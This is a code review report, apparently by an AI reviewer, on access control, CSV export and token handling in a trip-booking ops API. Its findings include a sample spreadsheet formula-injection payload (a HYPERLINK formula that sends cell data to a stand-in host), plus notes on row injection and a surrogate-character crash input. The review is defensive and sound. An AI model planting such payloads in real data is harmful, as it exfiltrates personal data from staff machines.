# Adversarial Diagnostic Review: Pedalo ops API handlers

I had no tools in this session, so nothing was executed. Every "traced" claim below comes from reading the code by hand.

## Pass 1: Reconstruct

The work adds a single `handle()` entry point:
- `/trips` returns the calling rider's own trips.
- `/staff/trips.json` and `/staff/trips.csv` export every trip, including rider names and emails.
- Authentication runs first, so an unknown or missing token gets 401.
- Any `/staff/` path with a non-staff token gets 403.

For this to be correct:
1. The token table in `auth.py` must be a real, secret credential store, or be replaced by one before production.
2. A rider's display name (`ident[0]`) must uniquely identify their trips.
3. The CSV export must be safe to open in a spreadsheet, which is what staff will do with it.
4. The 7 tests must actually guard the access rules the request specifies.

The unstated assumptions are that `auth.py` and `trips.py` are production code rather than fixtures, and that nobody needs an audit record of exports.

## Pass 2: Attack (Tracks B and R)

### Core access control (traced by hand)

| Case | Path through code | Result |
|---|---|---|
| No token (`None`) | `supplied = b""`, no match, `AuthError` | 401 ✔ |
| Rider on `/staff/trips.json` | `require_staff` raises | 403 ✔ |
| Rider on `/staff/anything` | same | 403 ✔ |
| Staff on `/staff/x` | passes the check, no exact match | 404 ✔ |
| `/staff` with no trailing slash | not caught by the `/staff/` prefix | 404, no data leaks ✔ |
| `/staff/../staff/trips.json`, `/STAFF/trips.json` | exact string match | 404, no bypass ✔ |
| Integer, bytes or empty token | coerced to `b""` | 401 ✔ |

The authorization logic matches the request. Exact-path matching after the prefix check means there is no traversal or case bypass.

### Tests (rule 5: mutations reasoned, not run)

- **Would go red:**
  - Removing `require_staff`: the two rider-export tests fail.
  - Making `for_rider` return all rows: the rider test fails.
  - Dropping emails from the CSV: the CSV test fails.
- **Would stay green:**
  - `all_rows()` returning `[]`. The JSON test only checks status 200.
  - Reordering `handle` so `/staff/` is checked before auth and a `None` ident yields 403 instead of 401. No test sends a missing token to a `/staff` route.
- **Pass status:** by tracing, all 7 tests should pass. The "7 pass" claim is PROBABLE, not CONFIRMED.

## Pass 3: Self-check

**Dropped:** I considered a timing side channel in the `compare_digest` loop. It leaks at most which slot matched and the token length, and with fixed tokens there is no realistic failure scenario.

**Downgraded:** the hardcoded-token finding depends on whether `auth.py` ships to production as written. I can't tell, so it is PROBABLE impact on a CONFIRMED fact.

**Most serious thing I might be missing:** how `request["path"]` and `token` are built from real HTTP. If the framework passes a raw path with a query string, or normalizes the path differently, the `/staff/` prefix check could behave differently than the exact-match routing. That would hide in the adapter, which I was not shown.

---

**VERDICT:** SHIP WITH FIXES. The requested 401/403 access rules are implemented correctly, but the export and credential handling are not production-safe for personal data.

**CONFIDENCE IN VERDICT:** medium. It is limited by not knowing whether `auth.py` and `trips.py` are fixtures or the production stores; if they ship as written, this becomes REWORK.

### FINDINGS

| # | Severity | Evidence | Location | What is wrong | Failure scenario | Fix or test |
|---|---|---|---|---|---|---|
| 1 | High | CONFIRMED (code); PROBABLE (impact) | `auth.py` `_TOKENS = {"tok-rita": …, "tok-sam": …, "tok-ola": …}` | Staff bearer tokens are hardcoded in source. They are guessable (`tok-<name>`), never expire, and cannot be rotated. | Anyone with repo access, or anyone who guesses `tok-<staffname>`, calls `/staff/trips.csv` and gets every rider's name and email. | Load hashed tokens from a secret store or identity provider, with expiry and revocation. Add a test that no literal token appears in source. If this file is only a fixture, say so and gate the deploy on its replacement. |
| 2 | High | CONFIRMED (no escaping); PROBABLE (exploit) | `trips.py` `as_csv`, the f-string join | Fields are not quoted or escaped, and there is no guard against spreadsheet formula injection. | A rider sets their name to `=HYPERLINK("http://x/?"&B3,"x")` or `Smith, J`. Staff open the export in Excel and the formula runs, or columns shift. A newline in a name injects a fake row. | Use `csv.writer` (`QUOTE_MINIMAL`). Prefix cells starting with `= + - @ \t \r` with `'`. Test with a name containing a comma, a quote, a newline and a leading `=`. |
| 3 | Medium | PROBABLE | `app.py` `trips.for_rider(ident[0])`; `trips.py` matches on `t["rider"] == name` | Trip ownership is keyed on display name, not a unique rider ID. | Two riders named "rita" each see the other's trips and email, which is a personal-data leak between riders. | Key trips and identities on an immutable rider ID. Test two riders who share a name. |
| 4 | Medium | CONFIRMED | `app.py` `/staff/` branch | Bulk exports of personal data leave no audit record of who exported what, or when. | A staff token is misused or leaked, and nobody can tell which exports happened. | Log the staff identity, path, timestamp and row count for each export, with no PII in the log. Test that an export writes an audit entry. |
| 5 | Medium | CONFIRMED | `test_app.py` `test_staff_can_export_json`; no-token tests | The JSON test asserts only the status code. No test covers a missing token on `/staff` routes or a rider on an unlisted `/staff/…` path. | A regression makes `all_rows()` return `[]`, or moves the staff check ahead of auth (giving 403 instead of 401). The suite stays green. | Assert the JSON body has all 3 rows, including the other rider's. Add `get("/staff/trips.json", None) → 401` and `get("/staff/x", "tok-rita") → 403`. |
| 6 | Low | CONFIRMED (trace) | `auth.py` `token.encode("utf-8")` | A token string with a lone surrogate (e.g. `"\ud800"` from JSON) raises `UnicodeEncodeError`, which is not caught. | A hostile token causes a 500 instead of a 401. | Use `encode("utf-8", "surrogatepass")`, or catch `UnicodeError` and raise `AuthError`. Add a test. |
| 7 | Low | CONFIRMED | `app.py` `request["path"]` vs `request.get("token")` | A missing `path` key raises `KeyError`. | A malformed request causes a 500. | Use `request.get("path", "")`. |

### WHAT HOLDS UP

- Authentication runs before routing, so no-token requests always get 401.
- The `/staff/` prefix gate gives a rider 403 on any staff path, including unknown ones.
- Exact path matching blocks traversal and case tricks.
- `compare_digest` on byte strings avoids the `TypeError` on non-ASCII tokens.
- Non-string tokens are rejected cleanly.
- `for_rider` and `all_rows` return copies, so callers cannot mutate the store.

### UNVERIFIED CLAIMS

- "7 tests pass": the trace says yes. Confirm with `python -m unittest test_app -v`.
- Whether `_TOKENS` and `_TRIPS` are production stores or fixtures: confirm with the author or deploy config.
- How the HTTP layer builds `path` and `token`: confirm by reviewing the adapter and testing with query strings and encoded paths.

### QUESTIONS FOR THE AUTHOR

1. Is `auth._TOKENS` what production will use? If yes, the verdict becomes REWORK.
2. Can riders choose or edit their names and emails? That determines how severe finding 2 is.
3. Is the rider name guaranteed unique, or is there a rider ID?

### DECISION-MAKER SUMMARY

The access rules work as requested. Do not deploy until the hardcoded staff tokens are replaced and the CSV export escapes its fields (findings 1 and 2). If you proceed anyway, anyone who learns or guesses a staff token can export all rider personal data, and a malicious rider name can run formulas on staff machines.

### OWNER SUMMARY

The new system correctly keeps riders out of the staff-only data exports. However, the staff passwords are written directly into the program and are easy to guess, and the spreadsheet export can be booby-trapped by a rider's name. Both should be fixed before launch because the exports contain customers' names and email addresses.

```json
{
  "verdict": "SHIP WITH FIXES",
  "findings": [
    {"severity": "High", "evidence_level": "CONFIRMED", "location": "auth.py _TOKENS", "scenario": "Hardcoded, guessable, non-expiring staff tokens (tok-sam, tok-ola) let anyone with repo access or a guess call /staff/trips.csv and export all rider names and emails.", "fix": "Load hashed tokens from a secret store/IdP with expiry and revocation; add a test that no literal tokens appear in source; gate deploy on replacing the fixture."},
    {"severity": "High", "evidence_level": "PROBABLE", "location": "trips.py as_csv f-string join", "scenario": "No CSV quoting or formula neutralisation: a rider name like =HYPERLINK(...) executes when staff open the export; commas or newlines shift columns or inject rows.", "fix": "Use csv.writer, prefix cells starting with = + - @ tab CR with an apostrophe; test with comma, quote, newline and leading '='."},
    {"severity": "Medium", "evidence_level": "PROBABLE", "location": "app.py trips.for_rider(ident[0]); trips.py t['rider'] == name", "scenario": "Ownership keyed on display name: two riders with the same name see each other's trips and email.", "fix": "Key on an immutable rider ID; add a same-name test."},
    {"severity": "Medium", "evidence_level": "CONFIRMED", "location": "app.py /staff/ branch", "scenario": "Bulk personal-data exports leave no audit trail, so misuse of a staff token goes undetected.", "fix": "Log staff identity, path, time and row count (no PII) per export; test that the log entry is written."},
    {"severity": "Medium", "evidence_level": "CONFIRMED", "location": "test_app.py test_staff_can_export_json and missing cases", "scenario": "all_rows() returning [] or a 403-before-401 reordering would keep the suite green; no test sends a missing token to /staff or a rider token to an unlisted /staff path.", "fix": "Assert JSON body contents; add tests for no-token on /staff/trips.json -> 401 and rider on /staff/x -> 403."},
    {"severity": "Low", "evidence_level": "CONFIRMED", "location": "auth.py current: token.encode('utf-8')", "scenario": "A lone-surrogate token raises UnicodeEncodeError, giving a 500 instead of a 401.", "fix": "Catch UnicodeError and raise AuthError; add a test."},
    {"severity": "Low", "evidence_level": "CONFIRMED", "location": "app.py request['path']", "scenario": "A request without a path key raises KeyError, giving a 500.", "fix": "Use request.get('path', '')."}
  ]
}
```